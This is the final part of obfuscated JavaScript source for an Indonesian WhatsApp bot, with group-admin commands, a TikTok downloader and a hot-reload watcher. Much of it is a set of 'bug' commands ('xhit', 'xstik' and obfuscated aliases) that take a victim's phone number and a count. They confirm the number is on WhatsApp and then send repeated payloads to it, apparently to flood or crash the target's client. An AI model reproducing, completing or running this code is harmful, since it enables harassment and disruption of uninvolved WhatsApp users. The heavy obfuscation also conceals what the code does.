            if (_0x26e9c3 == _0x5994ec(0x27c)) return;
            if (_0x17378d[_0x5994ec(0x1f0)] == 0x0) return _0xf21161(_0x5994ec(0x241));
            _0xf21161('please wait, ' + _0x433a5a + _0x5994ec(0x1dd)), await sleep(0x7d0), _0x1e628b(_0xcfc2f, _0x4845f8), await sleep(0x9c4), _0x4a7edc(_0x5994ec(0x2a5) + _0xcfc2f[_0x5994ec(0x27a)]('@')[0x0] + _0x5994ec(0x26b) + _0x433a5a + _0x5994ec(0x2f6), [_0xcfc2f]);
        }
        break;
        case _0x5994ec(0x2a2):
        case 'xstik':
        case _0x5994ec(0x237):
        case _0x5994ec(0x1da):
        case _0x5994ec(0x2f5):
        case _0x5994ec(0x2e0):
        case _0x5994ec(0x263):
        case _0x5994ec(0x325):
        case _0x5994ec(0x1eb):
        case _0x5994ec(0x2b5):
        case _0x5994ec(0x2d9):
        case _0x5994ec(0x24c):
        case _0x5994ec(0x30f):
        case _0x5994ec(0x24b):
        case _0x5994ec(0x2f4):
        case _0x5994ec(0x29f):
        case 'xhit': {
            if (!_0x1c014d && !_0xbbec7 && !_0x4dc8d5) return _0xf21161(_0x5994ec(0x1db));
            if (!q) return _0xf21161('*FORMAT BUG ' + _0x433a5a[_0x5994ec(0x25e)]() + '*\x0a\x0a*Example:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + ' 628xxxx,5\x0a\x0a©akmalmods');
            let _0x2bd589 = q[_0x5994ec(0x27a)](',')[0x0],
                _0x3c4550 = q[_0x5994ec(0x27a)](',')[0x1] * 0x5;
            if (!_0x2bd589) return _0xf21161(_0x5994ec(0x309) + _0x433a5a['toUpperCase']() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + ' number,jumlah\x0a\x0a*Contoh:*\x0a' + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (!_0x3c4550) return _0xf21161(_0x5994ec(0x309) + _0x433a5a[_0x5994ec(0x25e)]() + _0x5994ec(0x23f) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x23c) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2a8));
            if (isNaN(parseInt(_0x3c4550))) return _0xf21161(_0x5994ec(0x2bc));
            let _0x4824e5 = _0x2bd589[_0x5994ec(0x31c)](/[^0-9]/g, ''),
                _0x846aa1 = '' + encodeURI(_0x3c4550);
            var _0x17378d = await _0x6f03b9['onWhatsApp'](_0x4824e5 + _0x5994ec(0x1f3));
            let _0x53a2ba = _0x4824e5 + '@s.whatsapp.net';
            if (_0x4824e5 == _0x5994ec(0x27c)) return;
            if (_0x17378d[_0x5994ec(0x1f0)] == 0x0) return _0xf21161(_0x5994ec(0x241));
            _0xf21161(_0x5994ec(0x2c9) + _0x433a5a + _0x5994ec(0x1dd)), await sleep(0x7d0), _0x1e628b(_0x53a2ba, _0x846aa1), await sleep(0x9c4), _0x4a7edc(_0x5994ec(0x2a5) + _0x53a2ba[_0x5994ec(0x27a)]('@')[0x0] + _0x5994ec(0x26b) + _0x433a5a + _0x5994ec(0x2f6), [_0x53a2ba]);
        }
        break;
        case _0x5994ec(0x329):
            if (_0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x304)]) return;
            if (!_0x1c014d && !_0xbbec7) return _0xf21161(_0x5994ec(0x1db));
            if (!q) return _0xf21161(_0x5994ec(0x279));
            if (!_0x142125[0x0][_0x5994ec(0x24e)](_0x5994ec(0x2d5))) return _0xf21161(_0x5994ec(0x2e6));
            resjoin = _0x142125[0x0][_0x5994ec(0x27a)](_0x5994ec(0x2eb))[0x1];
            try {
                join = await _0x6f03b9[_0x5994ec(0x1ef)](resjoin), _0xf21161(join);
            } catch (_0x83660d) {
                _0xf21161(util['format'](_0x83660d));
            }
            break;
        case 'linkgrup':
        case _0x5994ec(0x305): {
            if (!_0x1bb58a) return _0xf21161('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!');
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            url_ = await _0x6f03b9[_0x5994ec(0x228)](_0x567336), yurl = 'https://chat.whatsapp.com/' + url_, _0xf21161(yurl);
        }
        break;
        case _0x5994ec(0x2a7):
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            await _0x6f03b9[_0x5994ec(0x235)](_0x567336, 'not_announcement');
            const _0x19501b = _0x5994ec(0x2af);
            _0xf21161(_0x19501b);
            break;
        case _0x5994ec(0x292):
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161('Fitur Ini Hanya Dapat Digunakan Oleh Admin!');
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            await _0x6f03b9[_0x5994ec(0x235)](_0x567336, _0x5994ec(0x322));
            const _0xe37a54 = _0x5994ec(0x2b6);
            _0xf21161(_0xe37a54);
            break;
        case _0x5994ec(0x31b): {
            if (!_0x1bb58a) return;
            if (!_0x36841f) return _0xf21161('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!');
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            await _0x6f03b9[_0x5994ec(0x30b)](_0x567336)[_0x5994ec(0x316)](_0x43a0f9 => _0xf21161(_0xf553c6(_0x43a0f9)))[_0x5994ec(0x2b0)](_0x5a073e => _0xf21161(_0xf553c6(_0x5a073e)));
        }
        break;
        case 'kick':
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            if (_0xd17bed[_0x5994ec(0x2df)]['extendedTextMessage'] === undefined || _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)] === null) return _0xf21161(_0x5994ec(0x297));
            _0xf21161(_0x5994ec(0x1d8)), remove = _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)][_0x5994ec(0x271)]['participant'], await _0x6f03b9[_0x5994ec(0x284)](_0x567336, [remove], _0x5994ec(0x28e));
            break;
        case _0x5994ec(0x2b3): {
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            let _0x3168e5 = [];
            _0x35f3c3[_0x5994ec(0x2f7)](_0xcc6c24 => _0x3168e5[_0x5994ec(0x223)](_0xcc6c24['id'])), _0x6f03b9[_0x5994ec(0x278)](_0x567336, {
                'text': q ? q : '',
                'mentions': _0x3168e5
            });
        }
        break;
        case 'promote': {
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!');
            if (_0xd17bed[_0x5994ec(0x2df)]['extendedTextMessage'] === undefined || _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)] === null) return _0xf21161(_0x5994ec(0x297));
            promote = _0xd17bed[_0x5994ec(0x2df)]['extendedTextMessage'][_0x5994ec(0x271)][_0x5994ec(0x21b)], await _0x6f03b9[_0x5994ec(0x284)](_0x567336, [promote], _0x5994ec(0x31e))[_0x5994ec(0x316)](_0x55752f => _0xf21161(_0xf553c6(_0x55752f)))[_0x5994ec(0x2b0)](_0x23eff0 => _0xf21161(_0xf553c6(_0x23eff0)));
        }
        break;
        case _0x5994ec(0x270): {
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            if (_0xd17bed['message'][_0x5994ec(0x27d)] === undefined || _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)] === null) return _0xf21161(_0x5994ec(0x297));
            demote = _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)]['contextInfo'][_0x5994ec(0x21b)], await _0x6f03b9[_0x5994ec(0x284)](_0x567336, [demote], _0x5994ec(0x270))[_0x5994ec(0x316)](_0x8fb5a2 => _0xf21161(_0xf553c6(_0x8fb5a2)))['catch'](_0x222855 => _0xf21161(_0xf553c6(_0x222855)));
        }
        break;
        case _0x5994ec(0x27e):
        case 'setsubject': {
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            if (!q) return _0xf21161(_0x5994ec(0x281));
            await _0x6f03b9['groupUpdateSubject'](_0x567336, q)[_0x5994ec(0x316)](_0x4a13d8 => _0xf21161(_0xf553c6(_0x4a13d8)))['catch'](_0x5be13c => _0xf21161(_0xf553c6(_0x5be13c)));
        }
        break;
        case 'setdesc':
        case 'setdesk': {
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161('Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!');
            if (!q) return _0xf21161(_0x5994ec(0x323));
            await _0x6f03b9[_0x5994ec(0x2b8)](_0x567336, q)[_0x5994ec(0x316)](_0x276333 => _0xf21161(_0xf553c6(_0x276333)))[_0x5994ec(0x2b0)](_0x48c459 => _0xf21161(_0xf553c6(_0x48c459)));
        }
        break;
        case _0x5994ec(0x2cc):
            if (!_0x1bb58a) return;
            if (!_0x1a09f0 && !_0xbbec7 && !_0x1c014d) return _0xf21161(_0x5994ec(0x2ae));
            if (!_0x36841f) return _0xf21161(_0x5994ec(0x2b9));
            if (_0x142125[0x0] === _0x5994ec(0x2a7)) await _0x6f03b9['groupSettingUpdate'](_0x567336, _0x5994ec(0x20f))[_0x5994ec(0x316)](_0xdc9efb => _0xf21161(_0x5994ec(0x24a)))[_0x5994ec(0x2b0)](_0x47fbf8 => _0xf21161(_0xf553c6(_0x47fbf8)));
            else _0x142125[0x0] === _0x5994ec(0x292) ? await _0x6f03b9[_0x5994ec(0x235)](_0x567336, _0x5994ec(0x2b7))[_0x5994ec(0x316)](_0x49d9f8 => _0xf21161(_0x5994ec(0x208)))[_0x5994ec(0x2b0)](_0x714902 => _0xf21161(_0xf553c6(_0x714902))) : _0xf21161(_0x5994ec(0x265) + (_0x3129e8 + _0x433a5a) + _0x5994ec(0x2e5));
            break;
        default:
            if (tiktokauto && _0x526377['includes'](_0x5994ec(0x2de)) && _0x5d1dcf != undefined) {
                if (!_0x526377[_0x5994ec(0x24e)](_0x5994ec(0x2de))) return;
                if (_0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x304)]) return;
                _0x4ef953('⏳');
                let {
                    Tiktok: _0x113db3
                } = require(_0x5994ec(0x257));
                try {
                    let _0x20078d = await _0x113db3(_0x526377);
                    cpp = _0x5994ec(0x289) + _0x20078d[_0x5994ec(0x29b)] + '\x0a \x0a - Title : ' + _0x20078d[_0x5994ec(0x1e7)], _0x6f03b9[_0x5994ec(0x278)](_0x567336, {
                        'video': {
                            'url': _0x20078d['nowm']
                        },
                        'caption': cpp
                    }, {
                        'quoted': _0xd17bed
                    })['then'](() => _0x4ef953('✅'));
                } catch (_0x2ef61c) {
                    await sleep(0x7d0), _0x4ef953('❌');
                }
            }
        }
    } catch (_0x14a9e0) {
        frm = _0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x2dc)], stravaRorr = async () => {
            const _0x4e5cd2 = _0x5994ec;
            _0x6f03b9['sendMessage'](frm, {
                'text': util[_0x4e5cd2(0x30e)](_0x14a9e0)
            });
        }, stravaRorr();
    }
};
let file = require['resolve'](__filename);
fs[_0x575978(0x269)](file, () => {
    const _0xdef253 = _0x575978;
    fs[_0xdef253(0x2ea)](file), console[_0xdef253(0x21a)](chalk[_0xdef253(0x2a6)](_0xdef253(0x1e8) + __filename)), delete require[_0xdef253(0x2da)][file], require(file);
});